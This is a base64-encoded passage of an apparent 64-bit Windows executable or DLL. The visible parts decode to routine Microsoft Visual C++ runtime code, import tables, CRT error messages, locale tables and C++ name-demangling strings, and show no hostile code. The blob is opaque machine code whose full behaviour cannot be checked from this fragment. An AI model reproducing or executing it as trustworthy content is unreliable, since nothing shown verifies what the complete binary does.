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AAQ29yRXhpdFByb2Nlc3MAAGsAZQByAG4AZQBsADMAMgAuAGQAbABsAAAAAAAAAAAARmxzQWxsb2MAAAAAAAAAAEZsc0ZyZWUARmxzR2V0VmFsdWUAAAAAAEZsc1NldFZhbHVlAAAAAABJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAAAAAAENyZWF0ZUV2ZW50RXhXAABDcmVhdGVTZW1hcGhvcmVFeFcAAAAAAABTZXRUaHJlYWRTdGFja0d1YXJhbnRlZQBDcmVhdGVUaHJlYWRwb29sVGltZXIAAABTZXRUaHJlYWRwb29sVGltZXIAAAAAAABXYWl0Rm9yVGhyZWFkcG9vbFRpbWVyQ2FsbGJhY2tzAENsb3NlVGhyZWFkcG9vbFRpbWVyAAAAAENyZWF0ZVRocmVhZHBvb2xXYWl0AAAAAFNldFRocmVhZHBvb2xXYWl0AAAAAAAAAENsb3NlVGhyZWFkcG9vbFdhaXQAAAAAAEZsdXNoUHJvY2Vzc1dyaXRlQnVmZmVycwAAAAAAAAAARnJlZUxpYnJhcnlXaGVuQ2FsbGJhY2tSZXR1cm5zAABHZXRDdXJyZW50UHJvY2Vzc29yTnVtYmVyAAAAAAAAAEdldExvZ2ljYWxQcm9jZXNzb3JJbmZvcm1hdGlvbgAAQ3JlYXRlU3ltYm9saWNMaW5rVwAAAAAAU2V0RGVmYXVsdERsbERpcmVjdG9yaWVzAAAAAAAAAABFbnVtU3lzdGVtTG9jYWxlc0V4AAAAAABDb21wYXJlU3RyaW5nRXgAR2V0RGF0ZUZvcm1hdEV4AEdldExvY2FsZUluZm9FeABHZXRUaW1lRm9ybWF0RXgAR2V0VXNlckRlZmF1bHRMb2NhbGVOYW1lAAAAAAAAAABJc1ZhbGlkTG9jYWxlTmFtZQAAAAAAAABMQ01hcFN0cmluZ0V4AAAAR2V0Q3VycmVudFBhY2thZ2VJZAAAAAAAR2V0VGlja0NvdW50NjQAAEdldEZpbGVJbmZvcm1hdGlvbkJ5SGFuZGxlRXhXAAAAU2V0RmlsZUluZm9ybWF0aW9uQnlIYW5kbGVXAAAAAAACAAAAAAAAAGAZAYABAAAACAAAAAAAAADAGQGAAQAAAAkAAAAAAAAAIBoBgAEAAAAKAAAAAAAAAIAaAYABAAAAEAAAAAAAAADQGgGAAQAAABEAAAAAAAAAMBsBgAEAAAASAAAAAAAAAJAbAYABAAAAEwAAAAAAAADgGwGAAQAAABgAAAAAAAAAQBwBgAEAAAAZAAAAAAAAALAcAYABAAAAGgAAAAAAAAAAHQGAAQAAABsAAAAAAAAAcB0BgAEAAAAcAAAAAAAAAOAdAYABAAAAHgAAAAAAAAAwHgGAAQAAAB8AAAAAAAAAcB4BgAEAAAAgAAAAAAAAAEAfAYABAAAAIQAAAAAAAACwHwGAAQAAACIAAAAAAAAAoCEBgAEAAAB4AAAAAAAAAAgiAYABAAAAeQAAAAAAAAAoIgGAAQAAAHoAAAAAAAAASCIBgAEAAAD8AAAAAAAAAGQiAYABAAAA/wAAAAAAAABwIgGAAQAAAFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAAAAAAAAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAAAAAAAAAAAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAAAAAAAAAAAAUgA2ADAAMQA3AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAG0AdQBsAHQAaQB0AGgAcgBlAGEAZAAgAGwAbwBjAGsAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAAAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAAAAAAAAAAABSADYAMAAzADIADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AYwBhAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAzAA0ACgAtACAAQQB0AHQAZQBtAHAAdAAgAHQAbwAgAHUAcwBlACAATQBTAEkATAAgAGMAbwBkAGUAIABmAHIAbwBtACAAdABoAGkAcwAgAGEAcwBzAGUAbQBiAGwAeQAgAGQAdQByAGkAbgBnACAAbgBhAHQAaQB2AGUAIABjAG8AZABlACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuACAASQB0ACAAaQBzACAAbQBvAHMAdAAgAGwAaQBrAGUAbAB5ACAAdABoAGUAIAByAGUAcwB1AGwAdAAgAG8AZgAgAGMAYQBsAGwAaQBuAGcAIABhAG4AIABNAFMASQBMAC0AYwBvAG0AcABpAGwAZQBkACAAKAAvAGMAbAByACkAIABmAHUAbgBjAHQAaQBvAG4AIABmAHIAbwBtACAAYQAgAG4AYQB0AGkAdgBlACAAYwBvAG4AcwB0AHIAdQBjAHQAbwByACAAbwByACAAZgByAG8AbQAgAEQAbABsAE0AYQBpAG4ALgANAAoAAAAAAFIANgAwADMANAANAAoALQAgAGkAbgBjAG8AbgBzAGkAcwB0AGUAbgB0ACAAbwBuAGUAeABpAHQAIABiAGUAZwBpAG4ALQBlAG4AZAAgAHYAYQByAGkAYQBiAGwAZQBzAA0ACgAAAAAARABPAE0AQQBJAE4AIABlAHIAcgBvAHIADQAKAAAAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFQATABPAFMAUwAgAGUAcgByAG8AcgANAAoAAAANAAoAAAAAAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAAAAAAAPABwAHIAbwBnAHIAYQBtACAAbgBhAG0AZQAgAHUAbgBrAG4AbwB3AG4APgAAAAAALgAuAC4AAAAKAAoAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABWAGkAcwB1AGEAbAAgAEMAKwArACAAUgB1AG4AdABpAG0AZQAgAEwAaQBiAHIAYQByAHkAAAAAAAAAAACAIwGAAQAAAJAjAYABAAAAoCMBgAEAAACwIwGAAQAAAGoAYQAtAEoAUAAAAAAAAAB6AGgALQBDAE4AAAAAAAAAawBvAC0ASwBSAAAAAAAAAHoAaAAtAFQAVwAAAFN1bgBNb24AVHVlAFdlZABUaHUARnJpAFNhdABTdW5kYXkAAE1vbmRheQAAVHVlc2RheQBXZWRuZXNkYXkAAAAAAAAAVGh1cnNkYXkAAAAARnJpZGF5AAAAAAAAU2F0dXJkYXkAAAAASmFuAEZlYgBNYXIAQXByAE1heQBKdW4ASnVsAEF1ZwBTZXAAT2N0AE5vdgBEZWMAAAAAAEphbnVhcnkARmVicnVhcnkAAAAATWFyY2gAAABBcHJpbAAAAEp1bmUAAAAASnVseQAAAABBdWd1c3QAAAAAAABTZXB0ZW1iZXIAAAAAAAAAT2N0b2JlcgBOb3ZlbWJlcgAAAAAAAAAARGVjZW1iZXIAAAAAQU0AAFBNAAAAAAAATU0vZGQveXkAAAAAAAAAAGRkZGQsIE1NTU0gZGQsIHl5eXkAAAAAAEhIOm1tOnNzAAAAAAAAAABTAHUAbgAAAE0AbwBuAAAAVAB1AGUAAABXAGUAZAAAAFQAaAB1AAAARgByAGkAAABTAGEAdAAAAFMAdQBuAGQAYQB5AAAAAABNAG8AbgBkAGEAeQAAAAAAVAB1AGUAcwBkAGEAeQAAAFcAZQBkAG4AZQBzAGQAYQB5AAAAAAAAAFQAaAB1AHIAcwBkAGEAeQAAAAAAAAAAAEYAcgBpAGQAYQB5AAAAAABTAGEAdAB1AHIAZABhAHkAAAAAAAAAAABKAGEAbgAAAEYAZQBiAAAATQBhAHIAAABBAHAAcgAAAE0AYQB5AAAASgB1AG4AAABKAHUAbAAAAEEAdQBnAAAAUwBlAHAAAABPAGMAdAAAAE4AbwB2AAAARABlAGMAAABKAGEAbgB1AGEAcgB5AAAARgBlAGIAcgB1AGEAcgB5AAAAAAAAAAAATQBhAHIAYwBoAAAAAAAAAEEAcAByAGkAbAAAAAAAAABKAHUAbgBlAAAAAAAAAAAASgB1AGwAeQAAAAAAAAAAAEEAdQBnAHUAcwB0AAAAAABTAGUAcAB0AGUAbQBiAGUAcgAAAAAAAABPAGMAdABvAGIAZQByAAAATgBvAHYAZQBtAGIAZQByAAAAAAAAAAAARABlAGMAZQBtAGIAZQByAAAAAABBAE0AAAAAAFAATQAAAAAAAAAAAE0ATQAvAGQAZAAvAHkAeQAAAAAAAAAAAGQAZABkAGQALAAgAE0ATQBNAE0AIABkAGQALAAgAHkAeQB5AHkAAABIAEgAOgBtAG0AOgBzAHMAAAAAAAAAAABlAG4ALQBVAFMAAAAobnVsbCkAAAAAAAAoAG4AdQBsAGwAKQAAAAAABgAABgABAAAQAAMGAAYCEARFRUUFBQUFBTUwAFAAAAAAKCA4UFgHCAA3MDBXUAcAACAgCAAAAAAIYGhgYGBgAAB4cHh4eHgIBwgAAAcACAgIAAAIAAgABwgAAAAAAAAAVQBTAEUAUgAzADIALgBEAEwATAAAAAAATWVzc2FnZUJveFcAAAAAAEdldEFjdGl2ZVdpbmRvdwBHZXRMYXN0QWN0aXZlUG9wdXAAAAAAAABHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAAAAAAAAAEdldFByb2Nlc3NXaW5kb3dTdGF0aW9uAAAAAAAAAAAAmCsBgAEAAACoKwGAAQAAALArAYABAAAAwCsBgAEAAADQKwGAAQAAAOArAYABAAAA8CsBgAEAAAAALAGAAQAAAAwsAYABAAAAGCwBgAEAAAAgLAGAAQAAADAsAYABAAAAQCwBgAEAAABKLAGAAQAAAEwsAYABAAAAWCwBgAEAAABgLAGAAQAAAGQsAYABAAAAaCwBgAEAAABsLAGAAQAAAHAsAYABAAAAdCwBgAEAAAB4LAGAAQAAAIAsAYABAAAAjCwBgAEAAACQLAGAAQAAAJQsAYABAAAAmCwBgAEAAACcLAGAAQAAAKAsAYABAAAApCwBgAEAAACoLAGAAQAAAKwsAYABAAAAsCwBgAEAAAC0LAGAAQAAALgsAYABAAAAvCwBgAEAAADALAGAAQAAAMQsAYABAAAAyCwBgAEAAADMLAGAAQAAANAsAYABAAAA1CwBgAEAAADYLAGAAQAAANwsAYABAAAA4CwBgAEAAADkLAGAAQAAAOgsAYABAAAA7CwBgAEAAADwLAGAAQAAAPQsAYABAAAA+CwBgAEAAAD8LAGAAQAAAAAtAYABAAAABC0BgAEAAAAILQGAAQAAABgtAYABAAAAKC0BgAEAAAAwLQGAAQAAAEAtAYABAAAAWC0BgAEAAABoLQGAAQAAAIAtAYABAAAAoC0BgAEAAADALQGAAQAAAOAtAYABAAAAAC4BgAEAAAAgLgGAAQAAAEguAYABAAAAaC4BgAEAAACQLgGAAQAAALAuAYABAAAA2C4BgAEAAAD4LgGAAQAAAAgvAYABAAAADC8BgAEAAAAYLwGAAQAAACgvAYABAAAATC8BgAEAAABYLwGAAQAAAGgvAYABAAAAeC8BgAEAAACYLwGAAQAAALgvAYABAAAA4C8BgAEAAAAIMAGAAQAAADAwAYABAAAAYDABgAEAAACAMAGAAQAAAKgwAYABAAAA0DABgAEAAAAAMQGAAQAAADAxAYABAAAASiwBgAEAAABQMQGAAQAAAGgxAYABAAAAiDEBgAEAAACgMQGAAQAAAMAxAYABAAAAX19iYXNlZCgAAAAAAAAAAF9fY2RlY2wAX19wYXNjYWwAAAAAAAAAAF9fc3RkY2FsbAAAAAAAAABfX3RoaXNjYWxsAAAAAAAAX19mYXN0Y2FsbAAAAAAAAF9fdmVjdG9yY2FsbAAAAABfX2NscmNhbGwAAABfX2VhYmkAAAAAAABfX3B0cjY0AF9fcmVzdHJpY3QAAAAAAABfX3VuYWxpZ25lZAAAAAAAcmVzdHJpY3QoAAAAIG5ldwAAAAAAAAAAIGRlbGV0ZQA9AAAAPj4AADw8AAAhAAAAPT0AACE9AABbXQAAAAAAAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAAAAAAAAYHZidGFibGUnAAAAAAAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAAAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAAAAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAAAAAAAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAAAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAAAAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAAAAAAIGRlbGV0ZVtdAAAAAAAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAAAAAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAAAAAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAAAAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGB2ZWN0b3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